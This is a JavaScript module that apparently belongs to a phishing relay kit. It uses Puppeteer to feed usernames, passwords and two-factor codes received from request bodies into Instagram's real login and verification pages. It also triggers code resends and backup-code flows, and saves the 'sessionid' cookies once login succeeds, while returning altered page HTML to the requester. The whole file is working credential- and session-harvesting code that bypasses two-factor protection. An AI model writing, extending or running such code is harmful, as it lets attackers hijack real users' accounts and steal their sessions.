const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                let username = '[name="username"]'
                await page.waitForSelector(username)
                let clearInputs = [username]
                for (let i = 0; i < clearInputs.length; i++) {
                    await page.focus(clearInputs[i])
                    await page.keyboard.down('Control')
                    await page.keyboard.press('A')
                    await page.keyboard.up('Control')
                    await page.keyboard.press('Backspace')
                }

                await page.type(username, this.email)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = []

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-login") {
                let username = '[name="username"]'
                let password = '[name="password"]'
                await page.waitForSelector(username)
                await page.waitForSelector(password)

                let clearInputs = [username, password]
                for (let i = 0; i < clearInputs.length; i++) {
                    await page.focus(clearInputs[i])
                    await page.keyboard.down('Control')
                    await page.keyboard.press('A')
                    await page.keyboard.up('Control')
                    await page.keyboard.press('Backspace')
                }

                await page.type(username, body.username)
                await page.type(password, body.password)
                await page.click('[type="submit"]')

                let resResult = false
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        if (response.url().startsWith("https://www.instagram.com/api/v1/web/accounts/login/ajax")) {
                            const contentType = response.headers()["content-type"]
                            if (contentType && contentType.includes("application/json")) {
                                const data = await response.json()
                                if (data["status"] == "fail"
                                    && data["error_type"] == "two_factor_required" && data["two_factor_required"] == true) {
                                    resResult = true
                                }
                            }

                            return true
                        }
                    }
                })

                const cookies = await page.cookies()
                for (const value of cookies) {
                    if (value.name == "sessionid" && value.value.length != 0) {
                        return await this.saveCookies()
                    }
                }

                if (resResult) {
                    await page.waitForNavigation({ waitUntil: "networkidle0" })
                    await new Promise(re => setTimeout(re, 1500))
                }
            } else if (spikeType == "otp-code") {
                const otpInput = `[name="verificationCode"]`
                await page.waitForSelector(otpInput)
                await page.focus(otpInput)
                await page.keyboard.down('Control')
                await page.keyboard.press('A')
                await page.keyboard.up('Control')
                await page.keyboard.press('Backspace')

                await page.type(otpInput, body.verificationCode)
                await page.evaluate(() => {
                    document.querySelectorAll("button").forEach(btn => {
                        if (btn.innerText == "Confirm") {
                            btn.click()
                        }
                    })
                })

                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        if (response.url().includes("two_factor")) {
                            return true
                        }
                    }
                })

                const cookies = await page.cookies()
                for (const value of cookies) {
                    if (value.name == "sessionid" && value.value.length != 0) {
                        return await this.saveCookies()
                    }
                }
            } else if (spikeType == "resend-otp") {
                await page.evaluate(() => {
                    document.querySelectorAll("button").forEach(btn => {
                        if (btn.innerText == "resend it") {
                            btn.click()
                        }
                    })
                })

                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        if (response.url().includes("send_two_factor_login_sms")) {
                            await new Promise(re => setTimeout(re, 1000))
                            return true
                        }
                    }
                })
            } else if (spikeType == "backup-codes") {
                await page.evaluate(() => {
                    document.querySelectorAll("button").forEach(btn => {
                        if (btn.innerText == "backup codes") {
                            btn.click()
                        }
                    })
                })

                await new Promise(re => setTimeout(re, 500))
            } else if (spikeType == "text-message") {
                await page.evaluate(() => {
                    document.querySelectorAll("button").forEach(btn => {
                        if (btn.innerText == "text message") {
                            btn.click()
                        }
                    })
                })

                await new Promise(re => setTimeout(re, 500))
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }